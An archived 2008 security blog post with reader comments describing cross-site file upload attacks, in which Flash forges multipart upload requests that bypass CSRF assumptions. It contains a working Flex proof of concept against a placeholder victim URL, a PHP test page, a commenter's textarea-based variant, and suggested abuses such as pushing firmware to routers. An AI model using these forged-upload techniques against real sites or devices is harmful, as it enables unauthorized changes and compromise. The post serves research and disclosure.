<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Cross-site File Upload Attacks</title><meta name="description" content="As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded."><meta property="name" content="Cross-site File Upload Attacks"><meta itemprop="name" content="Cross-site File Upload Attacks"><meta property="description" content="As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded."><meta itemprop="description" content="As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcross-site-file-upload-attacks%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcross-site-file-upload-attacks%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/cross-site-file-upload-attacks/"><meta property="og:title" content="Cross-site File Upload Attacks"><meta property="og:description" content="As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcross-site-file-upload-attacks%2F?w=1024"><meta name="twitter:title" content="Cross-site File Upload Attacks"><meta name="twitter:description" content="As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcross-site-file-upload-attacks%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Cross-site File Upload Attacks</h1><div class="date">Thu, 21 Feb 2008 12:15:32 GMT</div><div class="author">by
<a href="/members/pdp.html">pdp</a></div><div id="post-content"><p>As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded.</p>
<p>Unfortunately, when it comes to file upload facilities, developers often forget to make such checks relying on the fact that file uploads are not spoofable, which in general is the correct assumption. However, when dealing with Web technologies, we often stumble across nasty surprises. The reason CSRF attacks against file uploads are not possible is because the HTML FORM specifications are not versatile enough to define sub-fields like <code>filename=&quot;whatever.txt&quot;</code>, which are vital parts of the <code>multipart/form-data</code> specifications when submitting files. This is the only restriction and I will show you that attackers can easily overcome it with a bit of help from Flash.</p>
<h2 id="cross-site-file-uploads">Cross-site File Uploads</h2>
<p>We&#39;ve already proved that various forms of home routers can be <a href="/blog/hacking-the-interwebs/">entirely compromised</a> and hacked by <a href="/blog/flash-upnp-attack-faq/">forging UPnP requests with flash</a>. Now I will show you that file uploading facilities can be attacked in a similar way. Let&#39;s examine the following code, which you can compile with Flex2 SDK - <code>c:\Flex2\bin\mxmlc code.mxml</code>:</p>
<pre><code class="language-xml"><span class="tag">&lt;<span class="name">mx:Application</span> <span class="attr">xmlns:mx</span>=<span class="string">"http://www.adobe.com/2006/mxml"</span> <span class="attr">creationComplete</span>=<span class="string">"onAppInit()"</span>&gt;</span>
    <span class="tag">&lt;<span class="name">mx:Script</span>&gt;</span>
        /* by Petko D. Petkov; pdp
         * GNUCITIZEN
         **/
        import flash.net.*;

        private function onAppInit():void
        {
            var r:URLRequest = new URLRequest('http://victim.com/upload.php');

            r.method = 'POST';
            r.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22gc.txt%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0AHi from GNUCITIZEN%21%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22submit%22%0D%0A%0D%0ASubmit Query%0D%0A-----------------------------109092118919201--%0A');
            r.contentType = 'multipart/form-data; boundary=---------------------------109092118919201';

            navigateToURL(r, '_self');
        }
    <span class="tag">&lt;/<span class="name">mx:Script</span>&gt;</span>
<span class="tag">&lt;/<span class="name">mx:Application</span>&gt;</span></code></pre>
<p>If you carefully read the content of the script you will notice that we are preparing an <code>URLRequest</code> object which we load with a <code>POST</code> method, a <code>contentType</code> which equals to <code>multipart/form-data</code> and a url-encoded data text. If we unencode the text we get the following result. Now let&#39;s have a look at it as well. Notice the <code>filename=&quot;gc.txt&quot;</code> field:</p>
<pre><code class="language-http">-----------------------------109092118919201
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;gc.txt&quot;
Content-Type: text/plain

Hi from GNUCITIZEN!
-----------------------------109092118919201
Content-Disposition: form-data; name=&quot;submit&quot;

Submit Query
-----------------------------109092118919201--</code></pre>
<p>This looks like a valid <code>multipart/form-data</code> file upload, doesn&#39;t it? If you compile and execute the code you will see that the file upload is completely valid and will upload a file called <code>gc.txt</code> with content of <code>Hi from GNUCITIZEN!</code>. But you can also use the following PHP script to verify the result if you feel skeptical about the whole concept.</p>
<pre><code class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &gt; <span class="number">0</span>): <span class="meta">?&gt;</span>
    &lt;h1&gt;Failiure&lt;/h1&gt;
    &lt;pre&gt;
        <span class="meta">&lt;?php</span> print_r($_FILES) <span class="meta">?&gt;</span>
    &lt;/pre&gt;
<span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])): <span class="meta">?&gt;</span>
    &lt;h1&gt;Success&lt;/h1&gt;
    &lt;pre&gt;
        <span class="meta">&lt;?php</span> print_r($_FILES) <span class="meta">?&gt;</span>
        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]) <span class="meta">?&gt;</span>
    &lt;/pre&gt;
<span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span>
    &lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;
        &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>/&gt; 
        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>/&gt;
    &lt;/form&gt;
<span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></code></pre>
<h2 id="the-impact-of-cross-site-file-upload-csfu-attacks">The Impact of Cross-site File Upload (CSFU) Attacks</h2>
<p>Like CSRF attacks, there are plenty of things one can do with this type of technique. Here is a couple of evil things that come into my mind:</p>
<ul>
<li>Upload a nasty picture on someone&#39;s profile - I admit this is not very useful but still very funny and open for abuse.</li>
<li>Upload a shiny new firmware to the router that is under attack by using the user as a proxy. This is pretty nasty and given the fact that there are numerous authentication bypass and A-to-C bugs floating around, it is very, very feasible.</li>
<li>Upload a shiny new configuration file on the router that is under attack. Same as the one above - very feasible and easy to perform.</li>
<li>Upload executable scripts on CMS - this of course is a bit more targeted..</li>
</ul>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><a href="http://www.gnucitizen.org/about/mario" rel="nofollow">.mario</a> reported that <a href="http://kuza55.blogspot.com/" rel="nofollow">kuza55</a> has identified a similar problem which depends on a weird bug within Firefox, IE and Safari. Opera is not affected. Here is a demonstration of his code:

<pre><code>&lt;form method="post" action="http://kuza55.awardspace.com/files.php" enctype="multipart/form-data"&gt;
&lt;textarea name='file"; filename="filename.ext
Content-Type: text/plain; '&gt;Arbitrary File
Contents&lt;/textarea&gt;
&lt;input type="submit" value='Send "File"' /&gt;
&lt;/form&gt;</code></pre>

hmmm, very, very, interesting.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2f6303f9095f59c14c3097ef4df566f5?s=256&amp;d=retro" alt="kuza55"><span class="post-comment-author">kuza55</span><div class="post-comment-content">That's interesting. I've only played with the AS2 LoadVars Class (Since I've been to lazy to setup Flex, etc), so I thought you couldn't use Flash to do that since LoadVars URL encodes whatever you put in request body.

Are there many differences between the LoadVars and URLRequest classes?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><code>LoadVars</code> is inferior when compared to <code>URLRequest</code> combined with <code>navigateToURL</code> or even better <code>sendToURL</code>. Simply put, the <code>navigateToURL</code> function will open the result into a browser window/tab while <code>sendToURL</code> will silently execute it in the background. No restrictions applied!

btw, setting up flex environment is not very hard. you just need the FlexSDK .zip file. Decompress it somewhere on the disk. write your MXML or AS and compile with mxmlc like this:

<pre><code>path/to/flexsdk/<strong>bin/mxmlc path/to/app.mxml</strong></code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/680d96ca25f385f5c7a8caa341413aca?s=256&amp;d=retro" alt="757362"><span class="post-comment-author">757362</span><div class="post-comment-content">Interesting project. 

"Like CSRF attacks, there are plenty of things one can do with this type of technique."

- DOM XSS attack entry point.

Using haXe with the Flex2 Framework
http://haxe.org/manual/3/interop#using_haxe_with_the_flex2_framework</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8ae2c1a047f75c6ee65b77faf5433416?s=256&amp;d=retro" alt="guesty"><span class="post-comment-author">guesty</span><div class="post-comment-content">and how about spoofing the refe(f)rer with flash?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">it used to work but not sure what is the situation right now.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/bd8ac47a2a650bc3add0502686f33e39?s=256&amp;d=retro" alt="Matt Presson"><span class="post-comment-author">Matt Presson</span><div class="post-comment-content">Just a thought here, but after doing some simple research on Flash and file access, an attacker could use "one of the wrapper programs that have been written to allow local file access (SWF Studio, Zinc, Screenweaver, etc)" (per http://www.flash-creations.com/notes/servercomm_textfile.php) along with the above code to create a drive-by file upload service. Especially if you used sendToURL().

If I understand what is presented on the above referenced page, and I may not, then if you could get anyone to visit your page you could upload any file you wished to your server from their local machine.

Any thoughts? Am I crazy?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/54f766440ca8765336cfe8ead70116c6?s=256&amp;d=retro" alt="Danno"><span class="post-comment-author">Danno</span><div class="post-comment-content">Routers and modems bypassed, now cross site file upload attacks. Good thing I stopped playing poker online for cash. I don't use this thing to bank or trade stock on either. Cheeky, aren't they.

What is a n00b to do?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/dab9f1412262426064cb5e6e990d5d50?s=256&amp;d=retro" alt="maosud"><span class="post-comment-author">maosud</span><div class="post-comment-content">i want to upload file with a large size</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">this method should work although it could also fail from time to time.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a26ab14b9f92021db6fa10be81546e29?s=256&amp;d=retro" alt="blake"><span class="post-comment-author">blake</span><div class="post-comment-content">it works great for webmail (yahoo/symantec &amp; gmail).

see screenshots of yahoo and gmail in .ppt presentation back in July â€˜08 on www.appfuzzer.com</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/26d30779c4080f21f4c3709e015ebd2e?s=256&amp;d=retro" alt="site ekle"><span class="post-comment-author">site ekle</span><div class="post-comment-content">Thank you for article. I took great pleasure to read</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/aef3706bbe7b75c1cd8de34fbd7d06a9?s=256&amp;d=retro" alt="Sohbet"><span class="post-comment-author">Sohbet</span><div class="post-comment-content">Thank you for article. I took great pleasure to read (:</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2025 <a href=""></a>. All rights reserved.</p></footer></body></html>